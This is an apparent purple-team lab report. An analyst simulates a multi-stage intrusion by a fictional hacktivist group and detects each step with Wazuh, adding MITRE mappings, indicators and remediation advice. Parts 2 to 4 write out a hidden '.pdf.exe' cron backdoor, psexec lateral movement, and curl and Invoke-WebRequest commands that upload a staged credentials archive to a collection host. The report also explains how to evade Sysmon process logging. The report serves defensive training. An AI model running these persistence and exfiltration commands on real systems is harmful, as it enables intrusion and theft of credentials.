# Advanced Threat Intelligence & Cyber Kill Chain Analysis (Operation Crimson Dawn - APT Simulation)

## A Note on Methodology

This report documents a full **purple team exercise**, meaning the analyst who authored this report also executed every stage of the simulated attack before switching roles to investigate and contain it. Each section is structured in two parts:

- **Attack Execution**: what was done as the attacker, the exact commands run, and the outcome
- **SOC Investigation**: how the same activity was detected, queried, and mapped as a defender

This dual-role approach is deliberate. Understanding how an attack is built is what makes an analyst capable of detecting one.

## Executive Summary
The analyst conducted a structured simulation of a multi-stage intrusion by a fictional hacktivist group designated **Crimson Dawn** whose stated objective was to steal sensitive intellectual property and leak it publicly to damage organisational reputation. Every phase of the attack was executed hands-on by the analyst, then immediately investigated using the **Wazuh SIEM platform**.
 
The simulation confirmed that the organisation's network, as currently configured, would not survive this attack. A threat actor who successfully compromised the public-facing web server could move directly to internal workstations, stage sensitive credentials, and attempt exfiltration, all within a single session.
 
**The single most important finding:** The DMZ (the isolated boundary zone between internet-facing servers and internal systems) failed to block the attacker's pivot. A server that should have been quarantined from the internal network had unrestricted SMB access to internal workstations. That gap alone converts a contained perimeter breach into a full internal network compromise.

**Risk Rating:** 🔴 Critical

**Two actions require immediate executive approval and resource commitment:**

1. Enforce strict network segmentation between the DMZ and internal corporate network to prevent any future lateral movement from a compromised perimeter server.
2. Deploy Endpoint Detection and Response (EDR) across all servers and workstations to detect and block malicious behaviour in real time before data leaves the network.

Without these two investments, a real-world version of this attack would result in the public leak of corporate credentials, triggering regulatory penalties, client loss, and reputational damage that would take years to recover from.

---

## Lab Architecture

| Asset | Role | IP Address |
|---|---|---|
| **Wazuh Manager (Ubuntu)** | SIEM platform: collects and correlates all agent logs | None |
| **Prime-Ubuntu (Web Server VM)** | Simulated compromised DMZ web server: attacker's initial foothold | `192.168.43.216` |
| **FABELT (Windows Host)** | Internal Windows workstation - lateral movement target | `192.168.43.17` |

## Attack Timeline

![Attack Timeline Image]()

## Part 1 - Initial Breach: Reconnaissance and Delivery

### Attack Execution

To simulate the attacker's initial access phase, the SSH service on the Prime-Ubuntu web server (`192.168.43.216`) was targeted with deliberate failed authentication attempts. The following command was run to generate reconnaissance and brute-force telemetry:

```bash
ssh -v fatai@192.168.43.216
```

When prompted for a password, an incorrect password was intentionally supplied repeatedly. After several attempts the system returned:

```
Permission denied (publickey,password).
```

This simulated two distinct attacker behaviours: probing for active services on port 22 (reconnaissance), and submitting repeated invalid credentials (brute force). Both were performed against both a non-existent username and a real account with a wrong password, generating two distinct alert signatures in Wazuh.

![Reconnaissance and Delivery]()

---

### SOC Investigation

A Wazuh Dashboard query was created using the filter `rule.groups: "authentication_failed"` targeting the web server agent. This returned a clear record of repeated SSH authentication failures from a single source.

![Wazuh Dashboard showing authentication_failed alert filter results](images/part1_authentication_failed.png)

>Figure 1: Wazuh Dashboard query results for `rule.groups: "authentication_failed"`. The alert log shows repeated SSH login failures, both against non-existent users and a real account with incorrect passwords, confirming the attacker's brute-force reconnaissance phase.*

### MITRE ATT&CK Mapping

| Technique ID | Name | Evidence |
|---|---|---|
| **T1595** | Active Scanning: Scanning IP Blocks | Attacker probed network ports to identify the active SSH service on TCP port 22 |
| **T1110** | Brute Force | Repeated invalid login attempts against SSH, both non-existent and real user accounts with wrong passwords |

## Part 2 - Establishing Foothold: Exploitation and Persistence

### Attack Execution

With simulated access to the Prime-Ubuntu web server established, the next phase was to drop a persistent backdoor. Two actions were performed on the web server VM:

**Action 1 - Drop a hidden malicious payload:**

A hidden file with a double extension was created in the `/tmp` directory. The hidden prefix (`.`) causes the file to be invisible to standard `ls` listings, and the double extension (`.pdf.exe`) was designed to make the file appear as a PDF document during casual manual inspection while remaining an executable binary.

```bash
touch /tmp/.image.pdf.exe
chmod +x /tmp/.image.pdf.exe
```

The file was then written with a shell script simulating a C2 heartbeat, a recurring check-in to a command and control server:

```bash
echo '#!/bin/bash
echo "C2 Checkin" >> /tmp/.hidden-log' > /tmp/.image.pdf.exe
```

**Action 2 - Register cron job for persistence:**

The payload was then injected into the root user's cron table to execute automatically every minute:

```bash
crontab -e
# Entry added:
* * * * * /tmp/.image.pdf.exe
```

This ensures that even if the attacker's terminal session is closed, or the server is restarted, the backdoor continues to run while writing a timestamped heartbeat to `/tmp/.hidden-log` every 60 seconds. This is persistence.

![Establishing Foothold: Exploitation and Persistence]()

---

### SOC Investigation

**Query executed in Wazuh Dashboard:**

```
rule.groups: "syscheck"
```

Filtered to the Prime-Ubuntu endpoint. Two critical File Integrity Monitoring (FIM) events were returned:

- **Rule 554 (File Added)**: Captured the creation of `/tmp/.image.pdf.exe`
- **Rule 550 (File Modified)**: Captured repeated automated modifications to `/tmp/.hidden-log` driven by the cron-executed heartbeat script

![Wazuh File Integrity Monitoring results showing Rule 554 and 550](images/part2_fim_alerts.png)

> Figure 2: Wazuh FIM alerts from the Prime-Ubuntu web server. Rule 554 captured the creation of the hidden malicious payload `/tmp/.image.pdf.exe`. Rule 550 captured repeated automated modifications to `/tmp/.hidden-log`, driven by the cron-executed C2 heartbeat script.*

### MITRE ATT&CK Mapping

| Technique ID | Name | Evidence |
|---|---|---|
| **T1036** | Masquerading | Hidden file prefix (`.`) and double extension (`.pdf.exe`) used to disguise executable as a temporary image file and evade manual administrative review |
| **T1053.003** | Scheduled Task/Job: Cron | Malicious payload registered in root-level cron daemon, auto-executes every minute, persisting across reboots and terminal disconnections |

## Part 3 - Lateral Movement and Privilege Escalation Attempt

### Attack Execution

With a foothold established on the DMZ web server, the next objective was to pivot deeper into the network, targeting the internal Windows workstation (FABELT at `192.168.43.17`). From the compromised Prime-Ubuntu server, **psexec.py** from the Impacket suite was executed.

The tool attempted to authenticate to the Windows `ADMIN$` administrative share over **TCP port 445 (SMB)** and deploy a service binary for remote code execution. The target Windows system rejected the attempt with an explicit SMB session error `SMB SessionError: STATUS_LOGON_FAILURE(0xc000006d)`

The authentication failure was due to invalid credentials. However, the network connection itself succeeded, proving that the DMZ server had unrestricted routing access to the internal Windows workstation over SMB. That routing path should not exist.

![Lateral Movement and Privilege Escalation Attempt]()



### SOC Investigation

**Correlation query executed in Wazuh Dashboard:**

```
(data.win.system.eventID: 4624 AND logon.process: "psexec")
OR (data.win.system.eventID: 5140)
OR (data.win.system.eventID: 4625)
```

Filtered to the FABELT Windows endpoint. This returned the logon failure event with full forensic context.

![Wazuh Dashboard showing Windows Event ID 4625 Logon Failure alert on the FABELT endpoint](images/part3_lateral_movement.png)

> Figure 3: Wazuh alert for Windows Event ID 4625 (Logon Failure) on the FABELT Windows endpoint. Key forensic artifacts: Source IP 192.168.43.216 (the compromised Prime-Ubuntu server), Target Account: Administrator, Logon Type 3 (network-based SMB connection). This confirms an unauthorized lateral movement attempt across the internal network boundary.*

Forensic artifacts extracted from the event:

| Artifact | Value | Significance |
|---|---|---|
| **Source IP** | `192.168.43.216` | Originating from the compromised Prime-Ubuntu DMZ server |
| **Target Account** | `Administrator` | High-privilege account targeted |
| **Logon Type** | `3` | Network-based connection: SMB, not a local interactive logon |
| **Error Code** | `0xc000006d` | STATUS_LOGON_FAILURE: invalid credentials |

### MITRE ATT&CK Mapping

| Technique ID | Name | Evidence |
|---|---|---|
| **T1021.002** | Remote Services: SMB/Windows Admin Shares | `psexec.py` targeting `ADMIN$` over TCP 445 from `192.168.43.216`. Event ID 4625 captured on FABELT |

---

## Part 4 - Data Staging and Exfiltration Attempt

### Attack Execution

On the Windows host, the data theft sequence was executed in three steps:

**Step 1 - Create target data:**

```powershell
mkdir C:\SensitiveFiles
echo "admin:P@ssw0rd123, dbuser:S3cr3tDB!" > C:\SensitiveFiles\passwords.txt
```

**Step 2 - Compress and stage for exfiltration:**

The native Windows `tar.exe` binary was used deliberately — it is a signed Microsoft binary, which means it evades application allowlist controls that block unsigned third-party tools:

```powershell
tar.exe -czf C:\SensitiveFiles\exfil.tar.gz C:\SensitiveFiles\
```

Compressing the archive serves two purposes: it reduces the transfer size and bypasses file content monitoring tools that scan individual files by extension or signature.

**Step 3 - Attempt exfiltration to C2 server:**

**First attempt - PowerShell Invoke-WebRequest:**

```powershell
Invoke-WebRequest -Uri "http://192.168.43.216/upload" -Method POST -InFile C:\SensitiveFiles\exfil.tar.gz
```

The HTTP connection was dropped as no active listener was running on the destination port. The command returned a `WebException`. Critically, this method **also evaded Sysmon process creation logging** because `Invoke-WebRequest` executes internally within the PowerShell engine without spawning a child process.

**Second attempt - curl.exe:**

```powershell
curl.exe -X POST -F "file=@C:\SensitiveFiles\exfil.tar.gz" http://192.168.43.216/upload
```

As an external binary, `curl.exe` spawns a distinct process, successfully generating Sysmon telemetry.

![Data Staging and Exfiltration Attempt]()

---

### SOC Investigation

**Query executed in Wazuh Dashboard:**

```
data.win.system.eventID: 1
```

Filtered to the FABELT Windows endpoint, targeting process creation events for `tar.exe` and `curl.exe`.

Results confirmed:
- **tar.exe** process creation with command-line arguments showing compression of `C:\SensitiveFiles\`
- **curl.exe** process creation with command-line arguments exposing the destination C2 IP (`192.168.43.216`) and the archive being transferred

Sysmon **Event ID 3** (network connection) was also captured, recording the outbound TCP connection from `curl.exe` to `192.168.43.216`.

![Wazuh Dashboard showing Sysmon Event ID 1 process creation alerts for tar.exe (data compression) and curl.exe (exfiltration attempt)](images/part4_exfiltration.png)

> Figure 4: Wazuh Sysmon telemetry showing the two-stage exfiltration sequence. The top alert captures tar.exe compressing the SensitiveFiles directory. The second alert captures curl.exe initiating an outbound HTTP connection to the C2 server at 192.168.43.216, exposing the destination IP in the command-line arguments.

### MITRE ATT&CK Mapping

| Technique ID | Name | Evidence |
|---|---|---|
| **T1560.001** | Archive Collected Data: Archive via Utility | `tar.exe` used to compress `C:\SensitiveFiles\passwords.txt` into `exfil.tar.gz` before transfer |
| **T1041** | Exfiltration Over C2 Channel | Outbound HTTP transfer attempted via PowerShell `Invoke-WebRequest` and `curl.exe` targeting 192.168.43.216 |

## Part 5 - Strategic Countermeasures and Threat Intelligence Integration

### 5a: Custom Wazuh Detection Rule

With the attacker's C2 IP confirmed as `192.168.43.216`, a custom detection rule was written on the Wazuh Manager to generate a **Level 12 (High Severity)** alert for any future communication with this address. The rule was added to `/var/ossec/etc/rules/local_rules.xml`

![Wazuh local_rules.xml modified with custom rule ID 100001 Level 12 targeting the known Crimson Dawn C2 IP address](images/part5a_custom_rule.png)

> Figure 5: Wazuh Manager local rules file updated with custom rule ID 100001. Any future communication with the known C2 IP (192.168.43.216) will immediately trigger a Level 12 high-severity alert tagged to MITRE T1071.001 (Application Layer Protocol), enabling SOC analysts to detect C2 re-establishment instantly.*

### 5b: Vulnerability Detection Scan

A proactive vulnerability scan was executed against the Prime-Ubuntu web server using the Wazuh Vulnerability Detector module. The scan was queried using:

```
rule.groups: "vulnerability-detector"
```

**Result:** Zero critical CVEs were detected for the installed services. The host was confirmed as fully patched.

**Analyst Assessment:** The absence of known CVEs indicates Crimson Dawn likely gained initial access via one of three alternative vectors: a zero-day exploit, successful SSH credential brute-forcing (consistent with the Phase 1 findings), or exploitation of a system misconfiguration. The brute-force telemetry from Part 1 makes credential-based access the most probable initial vector.

![Wazuh Vulnerability Detector scan results for the Prime-Ubuntu web server](images/part5b_vulnerability_scan.png)

> Figure 6: Wazuh Vulnerability Detector results for the Prime-Ubuntu web server. Zero critical CVEs were returned for the installed service. This confirms the host was fully patched, and supports the assessment that initial access was gained through credential brute-forcing (consistent with Part 1 findings) rather than a known exploitable vulnerability.*


## Full Attack Narrative - Cyber Kill Chain Mapping

| Phase | Tactic | Technique ID | Technique Name | Evidence |
|---|---|---|---|---|
| 1 | Reconnaissance | T1595 | Active Scanning: Scanning IP Blocks | Network port scan identifying SSH on TCP 22 |
| 1 | Credential Access | T1110 | Brute Force | Repeated SSH login failures against real and non-existent accounts |
| 2 | Defense Evasion | T1036 | Masquerading | `/tmp/.image.pdf.exe` hidden prefix + double extension |
| 2 | Persistence | T1053.003 | Scheduled Task/Job: Cron | Root cron job executing payload every minute |
| 3 | Lateral Movement | T1021.002 | Remote Services: SMB/Windows Admin Shares | `psexec.py` targeting ADMIN$: Event ID 4625 captured |
| 4 | Collection | T1560.001 | Archive Collected Data: Archive via Utility | `tar.exe` compressing `SensitiveFiles` into `exfil.tar.gz` |
| 4 | Exfiltration | T1041 | Exfiltration Over C2 Channel | Outbound HTTP to 192.168.43.216 via PowerShell and curl.exe |
| 5 | Command & Control | T1071.001 | Application Layer Protocol | HTTP-based C2 heartbeat and exfiltration channel |


## Business Impact Assessment

| Impact Area | Assessment |
|---|---|
| **Data at Risk** | `C:\SensitiveFiles\passwords.txt`, corporate credentials and potential intellectual property were staged and compressed for exfiltration |
| **Reputational Risk** | Crimson Dawn operates as a hacktivist group with the explicit goal of publicly leaking stolen data. A successful exfiltration and public release of credentials would severely degrade client trust and invite immediate negative media coverage |
| **Regulatory and Financial Risk** | Exfiltration of credentials or PII triggers immediate regulatory notification obligations and potential fines. External incident response engagements and legal counsel would represent significant unplanned expenditure |
| **Operational Disruption** | Both the DMZ web server and the internal Windows workstation would require forensic imaging, malware eradication, and secure rebuilding, resulting in measurable downtime and productivity loss |
| **Network Trust Boundary Failure** | The confirmed ability of the DMZ server to route SMB traffic directly to internal workstations means **the blast radius of any future DMZ breach is the entire internal network**, not just the perimeter server |

## Root Cause Analysis

Four systemic failures enabled this attack chain to progress from initial reconnaissance to a near-successful data exfiltration:

1. **DMZ Network Segmentation Failure:** The compromised Prime-Ubuntu web server located in the DMZ was able to route SMB traffic (TCP 445) directly to the internal Windows workstation (FABELT). A properly segmented DMZ would have blocked this routing at the firewall layer. This is the most critical finding, it is the gap that converts a contained perimeter breach into a full internal network compromise.

2. **Insufficient Outbound Egress Filtering:** The internal Windows workstation was permitted to establish unrestricted outbound HTTP connections to an untrusted external IP address. Internal workstations should not be able to initiate arbitrary outbound connections, a proxy or egress firewall configured with an allow-list of known destinations would have blocked the C2 exfiltration traffic entirely.

3. **Exposed Management Interfaces:** The web server's SSH service (TCP 22) was accessible directly from the internet, enabling the attacker to execute remote brute-force authentication attempts at scale with no rate limiting or geographic restriction. Management ports should sit behind a VPN or Zero Trust gateway.

4. **Permissive Host Execution Policy:** The attacker successfully staged a malicious payload in the `/tmp` directory and established persistence via cron, indicating the endpoint lacked execution controls. Mounting `/tmp` with the `noexec` flag would have prevented script execution from that directory, eliminating the cron-based persistence vector entirely.

## Strategic Recommendations

The following four controls directly address each root cause identified above, ordered by implementation priority.

1. **Enforce Network Segmentation (Immediate):** Implement strict firewall Access Control Lists (ACLs) between the DMZ and the internal corporate network. Specifically, **block SMB (TCP 445), RDP (TCP 3389), and all administrative protocols** from originating in the DMZ and reaching internal workstations. This single control would have stopped the lateral movement phase entirely.

>**Business Justification:** Enforcing DMZ network segmentation eliminates the direct path from a perimeter breach to internal systems, reducing the blast radius of any future web server compromise from "entire internal network" to "one isolated server."

2. **Deploy Endpoint Detection and Response (Immediate):** Upgrade endpoint security from traditional antivirus to an active EDR solution across all servers and workstations. EDR provides real-time behavioural monitoring and blocking, it would have detected and stopped the cron job persistence attempt, the `psexec.py` execution, and the `tar.exe` data staging in real time, before any data left the host.

> **Business Justification:** Deploying EDR mitigates the risk of catastrophic data theft by neutralising internal threats that bypass our perimeter defences, protecting intellectual property and avoiding the regulatory fines that follow a confirmed data breach.

3. **Implement Outbound Egress Filtering (Short-term):** Deploy a Secure Web Gateway or egress firewall to restrict outbound internet access from internal workstations. Endpoints should only be permitted to communicate with known, categorised destinations, this would have blocked the `curl.exe` and `Invoke-WebRequest` C2 exfiltration attempts at the network layer.

4. **Secure Management Interfaces via Zero Trust (Short-term):** Remove direct public internet access to administrative services (SSH, RDP) on all DMZ servers. Require administrators to authenticate through a corporate VPN or Zero Trust Network Access (ZTNA) gateway before managing internet-facing infrastructure. This eliminates the brute-force attack surface entirely.

## Strategic Analysis

### If the Attacker Had Gained Windows Admin Rights

- Had `psexec.py` succeeded, the most impactful persistence technique available would have been `T1543.003 - Create or Modify System Process: Windows Service`. A malicious Windows service configured to start automatically on boot executes as the `SYSTEM` account, the most privileged context available on a Windows machine, before any user logs in. Unlike cron-based persistence, a malicious service is significantly harder to detect and remove, and runs at a privilege level that bypasses most user-context security controls.

### How Proactive Vulnerability Detection Could Have Prevented the Breach

- Had the Wazuh Vulnerability Detector been actively monitored prior to this incident, high-severity CVE alerts on the DMZ web server's installed services would have flagged the vulnerable attack surface before exploitation occurred. This shifts the security posture from reactive (detect the breach) to proactive (patch before the breach), eliminating the attack vector at its source rather than responding to it after the fact.

### How an Attacker Bypasses a C2 IP Block
 
- The custom Wazuh rule (Rule 100001) blocks communication with the known C2 IP `192.168.43.216`. An experienced attacker bypasses this by switching from a hardcoded IP to a **domain name** (e.g., `update-server.com`). If the IP gets blocked, the attacker updates the domain's DNS `A` record to point to a new, unblocked IP sometimes within seconds, using **Fast Flux DNS**. The blocked rule becomes irrelevant because the malware calls the domain, not the IP.
 
- **Defensive counter-measure:** IP-based blocking must be paired with DNS-based threat intelligence filtering and SSL inspection to catch domain-fronting evasion techniques.


## Challenges Encountered and Resolutions

### Challenge 1: File Integrity Monitoring Blind Spot

- **Challenge:** During the persistence phase, Wazuh failed to generate an alert for the malicious file dropped into `/tmp` because the default FIM configuration excludes `/tmp` from real-time monitoring due to the high volume of routine temporary system activity that would generate excessive noise.

- **Resolution:** The Wazuh agent's `ossec.conf` file was manually modified to add `/tmp` to the real-time monitoring scope: `<directories realtime="yes">/tmp</directories>`. Following an agent restart, Wazuh successfully captured both the file creation (Rule 554) and subsequent modification (Rule 550) events within the `/tmp` directory.

- **Lesson:** Default SIEM configurations are designed for noise reduction, not maximum visibility. High-value or high-risk directories that fall outside default scope require manual inclusion, a gap that must be addressed during initial deployment, not after an incident.

### Challenge 2: Process Logging Evasion via Native PowerShell Cmdlets

- **Challenge:** The initial exfiltration simulation using PowerShell's `Invoke-WebRequest` did not trigger Sysmon process creation logging (Event ID 1 / Event ID 4688). Because `Invoke-WebRequest` executes internally within the PowerShell engine, it does not spawn a child process making it invisible to process-creation-based detection rules.

- **Resolution:** A secondary exfiltration simulation using `curl.exe` was executed. As an external binary, `curl.exe` spawns a distinct process, successfully triggering Sysmon Event IDs 1 and 3, capturing both the command-line arguments and the destination C2 IP in the Wazuh dashboard.

- **Lesson:** Process-creation logging is necessary but not sufficient. Native PowerShell cmdlets, WMI calls, and COM-based execution all bypass it. Complete coverage requires **PowerShell Script Block Logging** (Event ID 4104) alongside Sysmon to capture inline cmdlet execution.

### Challenge 3: Legacy Vulnerability Simulation on Modern Infrastructure

- **Challenge:** The objective required installing a deliberately vulnerable FTP service to simulate a CVE-exploitable attack vector. Attempting to install a vulnerable package from 2014 failed, modern Ubuntu package mirrors have purged obsolete versions, forcing the installation of a current, fully patched FTP package.

- **Resolution:** Rather than artificially breaking the server environment, the scenario was adapted to reflect a realistic SOC outcome. The vulnerability scan correctly returned zero critical CVEs, demonstrating the Wazuh scanner was functioning accurately. The threat narrative was updated to position the initial breach as credential-based (brute force), consistent with the Part 1 evidence, which is also a more realistic attack vector for modern infrastructure.

- **Lesson:** Not all scenarios can be reproduced identically in modern environments. Adapting simulations to realistic constraints while preserving the analytical integrity of findings is a core SOC analyst skill.

## Consolidated Indicators of Compromise (IOCs)

| Type | Value | Phase |
|---|---|---|
| **Attacker IP / C2** | `192.168.43.216` | All phases: reconnaissance origin, C2 heartbeat destination, exfiltration endpoint |
| **Target Internal IP** | `192.168.43.17` (FABELT) | Lateral movement target |
| **Malicious File** | `/tmp/.image.pdf.exe` | Exploitation & Persistence: hidden payload with double extension |
| **C2 Heartbeat Log** | `/tmp/.hidden-log` | Automated modification every minute by cron job |
| **Persistence Mechanism** | Root cron job `echo "C2 Checkin" >> /tmp/.hidden-log` | Scheduled Task/Job: Cron |
| **Exfiltration Archive** | `C:\SensitiveFiles\exfil.tar.gz` | Data staging: compressed credentials |
| **Sensitive Data Targeted** | `C:\SensitiveFiles\passwords.txt` | Data Exfiltration target |
| **Exfiltration Tool 1** | `PowerShell Invoke-WebRequest` | Bypassed Sysmon process logging |
| **Exfiltration Tool 2** | `curl.exe` | Captured by Sysmon Event IDs 1 and 3 |
| **Lateral Movement Tool** | `psexec.py` (Impacket) | SMB/Windows Admin Shares |
| **SMB Target Share** | `ADMIN$` on 192.168.43.17 | Lateral movement target |
| **Wazuh Rule Deployed** | Rule ID 100001, Level 12 | Custom C2 IP detection rule |

> **Disclaimer:** This report documents a structured threat simulation conducted within an isolated lab environment as part of a cybersecurity training exercise. No production systems were accessed. All attacker actions, IP addresses, and file artifacts described in this report are simulated. This document is published for educational and portfolio purposes only.
